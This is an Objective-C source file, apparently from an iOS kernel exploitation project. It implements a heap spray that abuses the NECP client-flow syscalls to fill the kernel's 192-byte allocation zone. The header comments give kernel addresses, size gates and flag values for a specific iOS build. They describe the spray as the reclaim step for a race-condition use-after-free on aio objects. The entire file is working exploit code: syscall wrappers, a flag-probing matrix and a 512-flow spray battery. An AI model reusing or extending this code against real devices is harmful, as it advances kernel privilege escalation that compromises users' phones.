//
//  P179NecpFlowSpray.m — the NECP client-flow spray (kalloc.192, the aio zone).
//
//  The reclaim-vehicle primitive for the aio close-race lane (T8). Every
//  syscall offset + size gate is kernel-verified on 23F77 — findings
//  2026-11-21_necp_client_flow_reclaim_path.md:
//    - ADD buffer in [1,0x800] (the 0x900 receipt: >=0x801 rejects)
//    - ADD_FLOW buffer in [0x23,0xf0] (the inverted-gate receipt + the
//      recipe decode; 0x24 = the exact fixed header)
//    - client_id ptr len must be exactly 0x10
//    - action lives in the LOW 32 bits of the second syscall arg
//      (ldr w25,[x20,#8] @ 0xfffffff00a0c0494)
//    - the flow alloc is in necp_client_add_flow (case 0x11 of the action
//      switch) — NO entitlement on this path
//  PANIC-FREE (plain syscalls, legitimate objects, freed at fd close).
//  The receipts land in Documents/p179_necp_flow_log.txt.
//

#import "P179NecpFlowSpray.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <stdio.h>
#import <errno.h>
#import <sys/syscall.h>
#import <sys/socket.h>
#import <mach/mach_time.h>

#ifndef SYS_necp_open
#define SYS_necp_open 463            /* the stable XNU numbers (iOS 9.3+) */
#endif
#ifndef SYS_necp_client_action
#define SYS_necp_client_action 464
#endif

#define NECP179_ACTION_ADD 1u
#define NECP179_ACTION_ADD_FLOW 0x11u

#define P179_BUILD @"p179-necpflow-v1"

/* ---- the C ABI ---------------------------------------------------------- */

int necp179_open_fd(void) {
    int fd = (int)syscall(SYS_necp_open, 0);
    if (fd < 0) fd = (int)syscall(SYS_necp_open, (int)getpid());
    return fd;
}

int necp179_add_client(int fd, uint8_t cid_out[16]) {
    uint8_t params[NECP179_ADD_PARAMS_SIZE];
    memset(params, 0, sizeof params);
    if (cid_out) memset(cid_out, 0, 16);
    long rc = syscall(SYS_necp_client_action, fd,
                      (uint64_t)NECP179_ACTION_ADD,
                      cid_out ? cid_out : (uint8_t *)"",
                      (size_t)0x10, params, (size_t)sizeof params);
    return (int)rc;
}

void necp179_sa_fill(uint8_t sa[16], uint8_t a, uint8_t b, uint8_t c, uint8_t d,
                     uint16_t port) {
    memset(sa, 0, 16);
    sa[0] = 16;                                /* sin_len */
    sa[1] = AF_INET;                           /* sin_family */
    sa[2] = (uint8_t)(port >> 8);              /* sin_port (network order) */
    sa[3] = (uint8_t)(port & 0xff);
    sa[4] = a; sa[5] = b; sa[6] = c; sa[7] = d; /* sin_addr */
}

void necp179_req_fill(uint8_t *req, const uint8_t sa[16], uint16_t flags) {
    memset(req, 0, NECP179_FLOW_REQ_SIZE);
    memcpy(req + 0x10, sa, 16);                /* +0x10: the local sockaddr */
    *(uint16_t *)(req + 0x20) = flags;         /* +0x20: flags (bit6 = local) */
    *(uint16_t *)(req + 0x22) = 0;             /* +0x22: interface count */
}

int necp179_add_flow_req(int fd, const uint8_t cid[16], const uint8_t *req,
                         size_t reqlen) {
    long rc = syscall(SYS_necp_client_action, fd,
                      (uint64_t)NECP179_ACTION_ADD_FLOW,
                      (const void *)cid, (size_t)0x10,
                      (const void *)req, reqlen);
    return (int)rc;
}

int necp179_copy_result(int fd, const uint8_t cid[16], uint8_t *buf, size_t len) {
    memset(buf, 0, len);
    long rc = syscall(SYS_necp_client_action, fd,
                      (uint64_t)3u,                    /* COPY_RESULT */
                      (const void *)cid, (size_t)0x10,
                      (void *)buf, len);
    return (int)rc;
}

int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
                     uint16_t flags) {
    uint8_t req[NECP179_FLOW_REQ_SIZE];
    necp179_req_fill(req, sa, flags);
    return necp179_add_flow_req(fd, cid, req, sizeof req);
}

/* ---- the tap ------------------------------------------------------------ */

@implementation P179NecpFlowSpray

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject] ?: @"";
    int logfd = open([docs stringByAppendingPathComponent:
                      @"p179_necp_flow_log.txt"].fileSystemRepresentation,
                     O_CREAT | O_WRONLY | O_TRUNC, 0644);
#define NLOG(...) do { \
        char _lb[512]; int _n = snprintf(_lb, sizeof _lb, __VA_ARGS__); \
        /* the truncation law (the 22:12 receipt: the multiline identBlock blew \
           past 512 and write(_lb, _n) dumped STACK GARBAGE into the log): \
           snprintf returns the WOULD-BE length — cap it at the buffer. */ \
        if (_n < 0) _n = 0; else if (_n >= (int)sizeof _lb) _n = (int)sizeof _lb - 1; \
        fprintf(stderr, "%s\n", _lb); \
        if (logfd >= 0) { \
            if (_n > 0) write(logfd, _lb, (size_t)_n); \
            write(logfd, "\n", 1); fcntl(logfd, F_FULLFSYNC); \
        } \
        [_out appendFormat:@"%s\n", _lb]; \
    } while (0)
    NSMutableString *_out = out;

    NLOG("=== p179 session %s BUILD %s ===",
         [LabLocalMilitaryNow() UTF8String] ?: "?", P179_BUILD.UTF8String);
    NLOG("%s", [LabDeviceProfile identBlock].UTF8String ?: "");
    NLOG("NECP client-flow spray: necp_open(463,0) -> ADD(1, params in [1,0x800]) -> ADD_FLOW(0x11, req in [0x23,0xf0]).");
    NLOG("necp_client_flow = kalloc_type 0xb0 — the SAME 192-class bucket as aio_workq_entry (0xb8).");
    NLOG("PANIC-FREE. The shape matrix is the first-tap layout receipt.");
    NLOG("ABI: fd@+0x00, action@+0x08 (a1 low 32), cid_ptr@+0x10 (len 0x10), buffer@+0x20, size@+0x28.");
    NLOG("");

    /* 1. the fd */
    int nfd = necp179_open_fd();
    NLOG("[1] necp_open(463) = %d errno=%d %s", nfd, errno,
         nfd >= 0 ? "(client mode)" : "(ENOSYS = the syscall number decode-owed)");
    if (nfd < 0) {
        NLOG("HOLD — no necp fd. Nothing sprayed.");
        if (logfd >= 0) close(logfd);
        return out;
    }

    /* 2. the clients (ADD) — 8 staged */
    uint8_t cids[8][16];
    int clients_ok = 0;
    for (int i = 0; i < 8 && clients_ok < 8; i++) {
        uint8_t cid[16];
        int rc = necp179_add_client(nfd, cid);
        if (rc == 0) {
            memcpy(cids[clients_ok], cid, 16);   /* compact — no holes */
            NLOG("[2] ADD client %d rc=0 cid=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                 i, cid[0], cid[1], cid[2], cid[3],
                 cid[4], cid[5], cid[6], cid[7],
                 cid[8], cid[9], cid[10], cid[11],
                 cid[12], cid[13], cid[14], cid[15]);
            clients_ok++;
        } else {
            NLOG("[2] ADD client %d rc=%d errno=%d (%s)", i, rc, errno,
                 errno == EINVAL ? "the params blob parse — the >=0x801 shape decode-owed" :
                 errno == EPERM ? "gated after all — the receipt adjusts the findings" : "?");
        }
    }
    NLOG("[2] clients %d/8", clients_ok);
    if (clients_ok == 0) {
        NLOG("HOLD — no clients. The ADD params blob shape is decode-owed (findings §9).");
        close(nfd);
        if (logfd >= 0) close(logfd);
        return out;
    }

    /* 3. the flow shape matrix — the recipe decode's candidates:
       0x0000 = the GUARANTEED path (ret 0, one PERSISTENT flow per call —
                the unconditional kalloc_type at 0xfffffff00a0b6394);
       0x0004 = the site-0xa0c82e8 path (fires every call but TRANSIENT —
                the assign-results walker ENOENTs unless req+0x00..0x0f is
                a registered netagent uuid);
       0x0040 = the old bit6 guess (kept as the control). */
    static const uint16_t fl_cand[3] = {0x00, 0x04, 0x40};
    int best = -1;
    for (int k = 0; k < 3; k++) {
        uint8_t sa[16];
        necp179_sa_fill(sa, 10, 179, 0, (uint8_t)(1 + k), 5555 + k);
        uint8_t req[NECP179_FLOW_REQ_SIZE];
        necp179_req_fill(req, sa, fl_cand[k]);
        int rc = necp179_add_flow_req(nfd, cids[0], req, sizeof req);
        NLOG("[3] ADD_FLOW flags=0x%02x rc=%d errno=%d req-back=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
             fl_cand[k], rc, errno,
             req[0], req[1], req[2], req[3], req[4], req[5], req[6], req[7],
             req[8], req[9], req[10], req[11], req[12], req[13], req[14], req[15]);
        if (rc == 0 && best < 0) best = fl_cand[k];
    }
    if (best < 0) {
        NLOG("[3] no working ADD_FLOW shape — the request layout is decode-owed");
        NLOG("    (the +0x24 interface list or a policy-matched client may be required).");
        NLOG("HOLD — PANIC-FREE, nothing sprayed in volume. The receipts above are the matrix.");
        close(nfd);
        if (logfd >= 0) close(logfd);
        return out;
    }
    NLOG("[3] working shape: flags=0x%02x %s", best,
         best == 0x00 ? "(the GUARANTEED path — persistent flows, no netagent)" :
         best == 0x04 ? "(the transient site-0xa0c82e8 path — netagent-gated)" :
                        "(unmapped — the recipe file has the branch map)");
    NLOG("");

    /* 4. the volume battery — 8 clients x 64 flows, unique sockaddrs */
    uint64_t t0 = mach_absolute_time();
    int ok = 0, total = 0;
    for (int c = 0; c < clients_ok; c++) {
        for (int f = 0; f < 64; f++) {
            uint8_t sa[16];
            necp179_sa_fill(sa, 10, (uint8_t)(88 + c), (uint8_t)(f >> 8),
                            (uint8_t)(f & 0xff), (uint16_t)(0x4000 + f));
            int rc = necp179_add_flow(nfd, cids[c], sa, (uint16_t)best);
            total++;
            if (rc == 0) ok++;
        }
    }
    uint64_t t1 = mach_absolute_time();
    static mach_timebase_info_data_t tb;
    if (!tb.denom) mach_timebase_info(&tb);
    uint64_t us = (t1 - t0) * tb.numer / tb.denom / 1000;
    NLOG("[4] battery: %d/%d ADD_FLOW ok in %llu us (%llu us/flow avg)",
         ok, total, (unsigned long long)us,
         (unsigned long long)(total ? us / (uint64_t)total : 0));
    NLOG("    the v5 AVE2 churn took 100s of ms for far fewer 192-class slots —");
    NLOG("    this is the reclaim-cadence fix (findings §6).");

    /* 5. the teardown — the flow cleanup path */
    close(nfd);
    NLOG("[5] necp fd closed — the flow cleanup ran (the T8 receipt channel).");
    NLOG("");
    NLOG("=== p179 done: fd=%d clients=%d shape=0x%02x flows=%d/%d — the lane is %s ===",
         1, clients_ok, best, ok, total,
         ok > 0 ? "LIVE (the T8 reclaim vehicle is real)" : "BLOCKED (decode-owed)");

    if (logfd >= 0) close(logfd);
    return out;
}

@end
